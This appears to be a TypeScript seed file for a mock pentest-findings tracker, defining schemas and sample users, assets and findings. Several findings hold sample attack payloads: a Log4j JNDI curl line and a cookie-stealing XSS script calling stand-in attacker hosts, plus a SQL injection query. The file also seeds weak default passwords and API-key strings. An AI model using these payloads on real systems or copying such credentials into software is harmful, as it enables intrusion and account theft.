import crypto from 'crypto';

// -------------------------------------------------------------------------
// TYPINGS / SCHEMAS (MOCK DATABASE SHAPE)
// -------------------------------------------------------------------------

export interface User {
  id: string;
  uid: string;
  name: string;
  email: string;
  role: string;
  status: 'Active' | 'Suspended';
  avatar: string;
  passwordHash: string;
  emailVerified: boolean;
  totpEnabled: boolean;
  totpSecret: string | null;
  failedLoginAttempts: number;
  lockedUntil: Date | null;
  createdAt: Date;
  updatedAt: Date;
  deletedAt: Date | null;
}

export interface Project {
  id: string;
  name: string;
  description: string;
  health: 'Healthy' | 'Degraded' | 'Critical';
  status: 'Active' | 'Archived' | 'Draft';
  scope: string[];
  rulesOfEngagement: string;
  notes: string;
  team: string[];
  createdAt: Date;
  updatedAt: Date;
  deletedAt: Date | null;
}

export interface Asset {
  id: string;
  projectId: string;
  type: string;
  name: string;
  address: string;
  criticality: 'Low' | 'Medium' | 'High' | 'Critical';
  environment: 'Production' | 'Staging' | 'Development';
  tags: string[];
  status: 'Active' | 'Inactive';
  lastScanned: Date;
  owner: string | null;
  technology: string | null;
  operatingSystem: string | null;
  createdAt: Date;
  updatedAt: Date;
  deletedAt: Date | null;
}

export interface Assessment {
  id: string;
  projectId: string;
  name: string;
  scope: string[];
  rulesOfEngagement: string;
  status: 'Scheduled' | 'Active' | 'Completed';
  progress: number;
  startDate: string;
  endDate: string;
  assignedTeam: string[];
  findingsCount: number;
  createdAt: Date;
  updatedAt: Date;
  deletedAt: Date | null;
}

export interface Finding {
  id: string;
  projectId: string;
  identifier: string;
  title: string;
  description: string;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  cvss: number;
  asset: string;
  status: 'Open' | 'In Triage' | 'Assigned' | 'Resolved' | 'Closed';
  mitreAttack: string;
  cwe: string;
  owasp: string;
  proofOfConcept: string;
  recommendation: string;
  references: string[];
  assignedTo: string | null;
  discoveredAt: Date;
  evidence: string | null;
  attachments: string[];
  createdAt: Date;
  updatedAt: Date;
  deletedAt: Date | null;
}

export interface Comment {
  id: string;
  findingId: string;
  user: string;
  text: string;
  timestamp: Date;
}

export interface FindingHistory {
  id: string;
  findingId: string;
  user: string;
  action: string;
  timestamp: Date;
}

export interface AuditLog {
  id: string;
  timestamp: Date;
  user: string;
  action: string;
  ip: string;
  browser: string;
  severity: 'Info' | 'Warning' | 'Critical';
}

export interface Notification {
  id: string;
  message: string;
  read: boolean;
  createdAt: Date;
}

export interface ApiKey {
  id: string;
  userId: string;
  name: string;
  key: string;
  created: string;
  createdAt: Date;
  updatedAt: Date;
  deletedAt: Date | null;
}

export interface Organization {
  id: string;
  name: string;
  domain: string;
  subscriptionTier: string;
  createdAt: Date;
  updatedAt: Date;
  deletedAt: Date | null;
}

export interface Team {
  id: string;
  organizationId: string | null;
  name: string;
  description: string;
  createdAt: Date;
  updatedAt: Date;
  deletedAt: Date | null;
}

export interface Otp {
  id: string;
  email: string;
  otpHash: string;
  type: 'EMAIL_MFA' | 'PASSWORD_RESET' | 'EMAIL_VERIFICATION';
  attempts: number;
  expiresAt: Date;
  createdAt: Date;
}

export interface UserSession {
  id: string;
  userId: string;
  token: string;
  deviceInfo: string | null;
  ipAddress: string | null;
  rememberMe: boolean;
  expiresAt: Date;
  createdAt: Date;
  updatedAt: Date;
}

// Helper password hashing to replicate production
function hashPassword(password: string): string {
  const salt = crypto.randomBytes(16).toString('hex');
  const hash = crypto.pbkdf2Sync(password, salt, 10000, 64, 'sha512').toString('hex');
  return `${salt}:${hash}`;
}

// -------------------------------------------------------------------------
// IN-MEMORY IN-STORE ARRAYS
// -------------------------------------------------------------------------

export const store = {
  users: [] as User[],
  projects: [] as Project[],
  assets: [] as Asset[],
  assessments: [] as Assessment[],
  findings: [] as Finding[],
  comments: [] as Comment[],
  findingHistory: [] as FindingHistory[],
  auditLogs: [] as AuditLog[],
  notifications: [] as Notification[],
  apiKeys: [] as ApiKey[],
  organizations: [] as Organization[],
  teams: [] as Team[],
  otps: [] as Otp[],
  userSessions: [] as UserSession[]
};

// -------------------------------------------------------------------------
// RE-SEED INITIALIZATION FUNCTION
// -------------------------------------------------------------------------

export function seedDatabase() {
  store.users = [
    {
      id: '11111111-1111-1111-1111-111111111111',
      uid: 'firebase-uid-sa',
      name: 'S. Architect',
      email: 'davedhruvi076@gmail.com',
      role: 'Administrator',
      status: 'Active',
      avatar: 'SA',
      passwordHash: hashPassword('Admin@123'),
      emailVerified: true,
      totpEnabled: false,
      totpSecret: null,
      failedLoginAttempts: 0,
      lockedUntil: null,
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'admin-user-id',
      uid: 'uid-admin',
      name: 'Administrator',
      email: 'admin@redforge.local',
      role: 'Administrator',
      status: 'Active',
      avatar: 'AD',
      passwordHash: hashPassword('Admin@123'),
      emailVerified: true,
      totpEnabled: false,
      totpSecret: null,
      failedLoginAttempts: 0,
      lockedUntil: null,
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'analyst-user-id',
      uid: 'uid-analyst',
      name: 'SOC Analyst',
      email: 'analyst@redforge.local',
      role: 'Security Analyst',
      status: 'Active',
      avatar: 'AN',
      passwordHash: hashPassword('Analyst@123'),
      emailVerified: true,
      totpEnabled: false,
      totpSecret: null,
      failedLoginAttempts: 0,
      lockedUntil: null,
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'manager-user-id',
      uid: 'uid-manager',
      name: 'Manager',
      email: 'manager@redforge.local',
      role: 'Security Manager',
      status: 'Active',
      avatar: 'MA',
      passwordHash: hashPassword('Manager@123'),
      emailVerified: true,
      totpEnabled: false,
      totpSecret: null,
      failedLoginAttempts: 0,
      lockedUntil: null,
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: '22222222-2222-2222-2222-222222222222',
      uid: 'firebase-uid-hm',
      name: 'H. Miller',
      email: 'lead.pentester@reforge.io',
      role: 'Lead Pentester',
      status: 'Active',
      avatar: 'HM',
      passwordHash: hashPassword('Analyst@123'),
      emailVerified: true,
      totpEnabled: false,
      totpSecret: null,
      failedLoginAttempts: 0,
      lockedUntil: null,
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: '33333333-3333-3333-3333-333333333333',
      uid: 'firebase-uid-cr',
      name: 'C. Ramirez',
      email: 'soc.lead@reforge.io',
      role: 'Security Analyst',
      status: 'Active',
      avatar: 'CR',
      passwordHash: hashPassword('Analyst@123'),
      emailVerified: true,
      totpEnabled: false,
      totpSecret: null,
      failedLoginAttempts: 0,
      lockedUntil: null,
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: '44444444-4444-4444-4444-444444444444',
      uid: 'firebase-uid-mv',
      name: 'M. Vance',
      email: 'manager@reforge.io',
      role: 'Security Manager',
      status: 'Active',
      avatar: 'MV',
      passwordHash: hashPassword('Manager@123'),
      emailVerified: true,
      totpEnabled: false,
      totpSecret: null,
      failedLoginAttempts: 0,
      lockedUntil: null,
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    }
  ];

  store.projects = [
    {
      id: 'b1111111-1111-1111-1111-111111111111',
      name: 'Enterprise Perimeter Audit',
      description: 'Continuous monitoring of public-facing gateways, external subdomains, cloud entry points, and legacy web portals.',
      health: 'Degraded',
      status: 'Active',
      scope: ['*.reforge.io', 'api.prod.reforge.io', 'portal.auth.internal', 'rf-customer-data-01'],
      rulesOfEngagement: 'Testing only during off-peak hours (02:00 - 06:00 UTC). Standard SQLi, XSS, and authorization bypass probing is allowed.',
      notes: 'Perimeter needs special attention. Cloud buckets were recently hardened but legacy servers remain unpatched.',
      team: ['S. Architect', 'Lead Pentester', 'Security Manager'],
      createdAt: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'b2222222-2222-2222-2222-222222222222',
      name: 'Internal DevSecOps Scan',
      description: 'Vulnerability assessments for staging VMs, CI/CD runners, and private database servers inside corporate subnets.',
      health: 'Healthy',
      status: 'Active',
      scope: ['10.240.12.83', 'runner-04.stage.reforge.io', 'https://admin-legacy.dev.reforge.internal'],
      rulesOfEngagement: 'Automated continuous discovery scans are authorized. No destructive actions on DB servers.',
      notes: 'Internal DB server contains a SQL Injection that has been locked down from outer access, but still needs patching.',
      team: ['S. Architect', 'Security Analyst'],
      createdAt: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000),
      updatedAt: new Date(),
      deletedAt: null
    }
  ];

  store.assets = [
    {
      id: 'a1111111-1111-1111-1111-111111111111',
      projectId: 'b1111111-1111-1111-1111-111111111111',
      type: 'Domain',
      name: 'Production API Gateway',
      address: 'api.prod.reforge.io',
      criticality: 'Critical',
      environment: 'Production',
      tags: ['core-api', 'kubernetes', 'gateway'],
      status: 'Active',
      lastScanned: new Date(),
      owner: 'S. Architect',
      technology: 'NGINX / Kubernetes',
      operatingSystem: 'Ubuntu Linux 22.04',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'a2222222-2222-2222-2222-222222222222',
      projectId: 'b2222222-2222-2222-2222-222222222222',
      type: 'IP',
      name: 'Internal Database Cluster Instance',
      address: '10.240.12.83',
      criticality: 'Critical',
      environment: 'Production',
      tags: ['database', 'cluster', 'node-03'],
      status: 'Active',
      lastScanned: new Date(),
      owner: 'S. Architect',
      technology: 'PostgreSQL 15',
      operatingSystem: 'Debian 12',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'a3333333-3333-3333-3333-333333333333',
      projectId: 'b1111111-1111-1111-1111-111111111111',
      type: 'URL',
      name: 'Customer Authentication Portal',
      address: 'https://portal.auth.internal/login',
      criticality: 'High',
      environment: 'Production',
      tags: ['identity', 'keycloak', 'external'],
      status: 'Active',
      lastScanned: new Date(),
      owner: 'S. Architect',
      technology: 'Keycloak OIDC',
      operatingSystem: 'RedHat Enterprise Linux',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'a4444444-4444-4444-4444-444444444444',
      projectId: 'b1111111-1111-1111-1111-111111111111',
      type: 'Cloud',
      name: 'Customer S3 Object Storage',
      address: 's3://rf-customer-data-01',
      criticality: 'High',
      environment: 'Production',
      tags: ['aws-s3', 'storage', 'pii'],
      status: 'Active',
      lastScanned: new Date(),
      owner: 'S. Architect',
      technology: 'Amazon Web Services S3',
      operatingSystem: 'Cloud Storage API',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'a5555555-5555-5555-5555-555555555555',
      projectId: 'b2222222-2222-2222-2222-222222222222',
      type: 'Server',
      name: 'Staging Build Runner VM',
      address: 'runner-04.stage.reforge.io',
      criticality: 'Medium',
      environment: 'Staging',
      tags: ['ci-cd', 'jenkins', 'internal'],
      status: 'Active',
      lastScanned: new Date(),
      owner: 'Lead Pentester',
      technology: 'Jenkins Pipeline',
      operatingSystem: 'Rocky Linux 9',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'a6666666-6666-6666-6666-666666666666',
      projectId: 'b2222222-2222-2222-2222-222222222222',
      type: 'Application',
      name: 'Legacy Admin Dashboard',
      address: 'https://admin-legacy.dev.reforge.internal',
      criticality: 'Medium',
      environment: 'Development',
      tags: ['django', 'legacy', 'deprecated'],
      status: 'Inactive',
      lastScanned: new Date(),
      owner: 'S. Architect',
      technology: 'Django Web Framework',
      operatingSystem: 'Alpine Linux',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    }
  ];

  store.assessments = [
    {
      id: 'd1111111-1111-1111-1111-111111111111',
      projectId: 'b1111111-1111-1111-1111-111111111111',
      name: 'Q3 Enterprise External Red Team Assessment',
      scope: ['api.prod.reforge.io', 'portal.auth.internal', 'rf-customer-data-01'],
      rulesOfEngagement: 'Strictly active probing allowed off-peak. Use standard SQLi and XSS models.',
      status: 'Active',
      progress: 68,
      startDate: '2026-07-01',
      endDate: '2026-07-15',
      assignedTeam: ['S. Architect', 'Lead Pentester', 'SOC Analyst'],
      findingsCount: 4,
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'd2222222-2222-2222-2222-222222222222',
      projectId: 'b2222222-2222-2222-2222-222222222222',
      name: 'Automated Kubernetes Node Audit Scan',
      scope: ['10.240.12.83', 'runner-04.stage.reforge.io'],
      rulesOfEngagement: 'Weekly automated system audits.',
      status: 'Completed',
      progress: 100,
      startDate: '2026-07-05',
      endDate: '2026-07-06',
      assignedTeam: ['System Automator'],
      findingsCount: 1,
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'd3333333-3333-3333-3333-333333333333',
      projectId: 'b1111111-1111-1111-1111-111111111111',
      name: 'Regulatory ISO-27001 Pre-Compliance Audit',
      scope: ['All Corporate Networks', 'Cloud Accounts'],
      rulesOfEngagement: 'Passive documentation checking and compliance scans.',
      status: 'Scheduled',
      progress: 0,
      startDate: '2026-08-01',
      endDate: '2026-08-10',
      assignedTeam: ['Security Manager', 'External Auditor'],
      findingsCount: 0,
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    }
  ];

  store.findings = [
    {
      id: 'f1111111-1111-1111-1111-111111111111',
      projectId: 'b1111111-1111-1111-1111-111111111111',
      identifier: 'CVE-2024-1242',
      title: 'Log4j Apache Remote Code Execution Discovery',
      description: 'The remote web gateway exposes an unpatched Apache Log4j log parser engine. An attacker can construct a payload containing malicious JNDI string tokens to initiate background TCP execution.',
      severity: 'Critical',
      cvss: 9.8,
      asset: 'api.prod.reforge.io',
      status: 'In Triage',
      mitreAttack: 'T1190',
      cwe: 'CWE-502',
      owasp: 'A08',
      proofOfConcept: 'curl -H "User-Agent: ${jndi:ldap://attacker-command-server.ru/exploit}" http://api.prod.reforge.io/',
      recommendation: 'Update Apache Log4j core packages immediately to version 2.17.1 or disable lookup support explicitly.',
      references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-44228', 'https://logging.apache.org/log4j/2.x/security.html'],
      assignedTo: 'S. Architect',
      discoveredAt: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000),
      evidence: 'Matched remote vulnerability pattern signatures for Log4j.',
      attachments: ['log4j_vuln_report.pdf'],
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'f2222222-2222-2222-2222-222222222222',
      projectId: 'b1111111-1111-1111-1111-111111111111',
      identifier: 'CVE-2023-9912',
      title: 'Authentication Bypass via Insecure Direct Object Reference (IDOR)',
      description: 'By supplying incrementing identifier counts inside user cookie payloads, authenticated operators can bypass standard access controls to retrieve arbitrary internal customer accounts.',
      severity: 'High',
      cvss: 8.5,
      asset: 'portal.auth.internal',
      status: 'Assigned',
      mitreAttack: 'T1539',
      cwe: 'CWE-639',
      owasp: 'A01',
      proofOfConcept: 'GET /api/accounts?userId=1337 HTTP/1.1 -> returns full customer JSON record.',
      recommendation: 'Enforce strict backend authorization verification matching caller sessions against requested resource indices.',
      references: ['https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control/'],
      assignedTo: 'S. Architect',
      discoveredAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000),
      evidence: 'Retrieved accounts using automated python testing runner script.',
      attachments: [],
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'f3333333-3333-3333-3333-333333333333',
      projectId: 'b1111111-1111-1111-1111-111111111111',
      identifier: 'CVE-2024-0012',
      title: 'Misconfigured Public S3 Bucket Exposing Sensitive Artifacts',
      description: 'The AWS S3 bucket was found configured with public read access lists, exposing zip files containing legacy configuration files, backups, and user logs.',
      severity: 'High',
      cvss: 7.5,
      asset: 'rf-customer-data-01',
      status: 'Resolved',
      mitreAttack: 'T1530',
      cwe: 'CWE-306',
      owasp: 'A05',
      proofOfConcept: 'aws s3 ls s3://rf-customer-data-01/ --no-sign-request',
      recommendation: 'Update bucket policy, activate "Block all public access" controls, and force encrypted private bucket parameters.',
      references: ['https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/'],
      assignedTo: 'Blue Team',
      discoveredAt: new Date(Date.now() - 6 * 24 * 60 * 60 * 1000),
      evidence: 'Downloaded file listing of customer bucket.',
      attachments: ['s3_bucket_permissions.png'],
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'f4444444-4444-4444-4444-444444444444',
      projectId: 'b2222222-2222-2222-2222-222222222222',
      identifier: 'CVE-2024-8822',
      title: 'SQL Injection Vulnerability in Global Search Filter Endpoint',
      description: 'The query parameter of the internal database inventory search does not sanitize special characters. Attacking hosts can concatenate custom SQL commands to dump schema tables.',
      severity: 'Critical',
      cvss: 9.3,
      asset: '10.240.12.83',
      status: 'Open',
      mitreAttack: 'T1190',
      cwe: 'CWE-89',
      owasp: 'A03',
      proofOfConcept: "GET /api/search?q=test' UNION SELECT username, password_hash FROM users--",
      recommendation: 'Transition raw SQL expressions to prepared parameterized queries or utilize robust object-relational mapping models.',
      references: ['https://owasp.org/www-community/attacks/SQL_Injection'],
      assignedTo: 'SOC Lead',
      discoveredAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000),
      evidence: 'SQL Exception error returned in response payload.',
      attachments: [],
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'f5555555-5555-5555-5555-555555555555',
      projectId: 'b2222222-2222-2222-2222-222222222222',
      identifier: 'CVE-2024-9182',
      title: 'Cross-Site Scripting (XSS) via Legacy User profile fields',
      description: 'The operator details bio field fails to encode raw HTML/JavaScript variables on output, leading to execution when other administrators inspect the profiling card.',
      severity: 'Medium',
      cvss: 6.1,
      asset: 'https://admin-legacy.dev.reforge.internal',
      status: 'Open',
      mitreAttack: 'T1204.002',
      cwe: 'CWE-79',
      owasp: 'A03',
      proofOfConcept: "<script>fetch('http://attacker.ru/steal?cookie=' + document.cookie)</script>",
      recommendation: 'Implement HTML entity encoding and DOMpurify library filtering on all administrative output layers.',
      references: [],
      assignedTo: 'Blue Team',
      discoveredAt: new Date(Date.now() - 4 * 24 * 60 * 60 * 1000),
      evidence: 'Injected a proof alert tag which executed successfully.',
      attachments: [],
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    }
  ];

  store.comments = [
    {
      id: 'c1',
      findingId: 'f1111111-1111-1111-1111-111111111111',
      user: 'S. Architect',
      text: 'I have confirmed this log4j vulnerability exists on the legacy gateway. Initiating mitigation steps.',
      timestamp: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000)
    },
    {
      id: 'c2',
      findingId: 'f1111111-1111-1111-1111-111111111111',
      user: 'Lead Pentester',
      text: 'Exploit works consistently. Confirming priority critical status.',
      timestamp: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000)
    }
  ];

  store.findingHistory = [
    {
      id: 'h1',
      findingId: 'f1111111-1111-1111-1111-111111111111',
      user: 'AutoScanner Engine',
      action: 'Vulnerability Discovered',
      timestamp: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000)
    },
    {
      id: 'h2',
      findingId: 'f1111111-1111-1111-1111-111111111111',
      user: 'S. Architect',
      action: 'Shifted triage state to In Triage',
      timestamp: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000)
    }
  ];

  store.auditLogs = [
    {
      id: 'e1111111-1111-1111-1111-111111111111',
      timestamp: new Date(Date.now() - 4 * 3600000),
      user: 'admin@redforge.local',
      action: 'Initiated targeted credential-stuffing vulnerability scan on authentication portal',
      ip: '192.168.4.150',
      browser: 'Chrome 125.0',
      severity: 'Info'
    },
    {
      id: 'e2222222-2222-2222-2222-222222222222',
      timestamp: new Date(Date.now() - 2 * 3600000),
      user: 'System Bot',
      action: 'Discovered critical vulnerability: CVE-2024-8822 (SQLi) on 10.240.12.83',
      ip: '10.0.1.25',
      browser: 'Scanner Runner',
      severity: 'Critical'
    }
  ];

  store.apiKeys = [
    {
      id: '91111111-1111-1111-1111-111111111111',
      userId: '11111111-1111-1111-1111-111111111111',
      name: 'Continuous Pipeline Scraper Bot',
      key: 'rf_live_72k4921f90a2e1d842c90a192bc03810ff42',
      created: '2026-05-12',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: '92222222-2222-2222-2222-222222222222',
      userId: '11111111-1111-1111-1111-111111111111',
      name: 'Enterprise SIEM (Splunk Feed)',
      key: 'rf_live_d8439acb39a8e2d23fba9310de43029bcda9',
      created: '2026-06-01',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    }
  ];

  store.notifications = [
    {
      id: '81111111-1111-1111-1111-111111111111',
      message: 'Vulnerability Scan Engine finished scheduled node crawl on external subnets.',
      read: false,
      createdAt: new Date()
    },
    {
      id: '82222222-2222-2222-2222-222222222222',
      message: 'Urgent mitigation completed on rf-customer-data-01 bucket. Access list hardened.',
      read: false,
      createdAt: new Date()
    }
  ];

  store.organizations = [
    {
      id: 'org-1',
      name: 'Redforge Enterprise',
      domain: 'redforge.local',
      subscriptionTier: 'Platinum',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    }
  ];

  store.teams = [
    {
      id: 'team-1',
      organizationId: 'org-1',
      name: 'Threat Intelligence',
      description: 'Core intelligence harvesting and offensive malware hunting squad.',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    },
    {
      id: 'team-2',
      organizationId: 'org-1',
      name: 'Incident Response',
      description: 'Emergency patch deployment, active threat containment, and forensics.',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: null
    }
  ];

  store.otps = [];
  store.userSessions = [];
}

// Automatically seed at startup
seedDatabase();
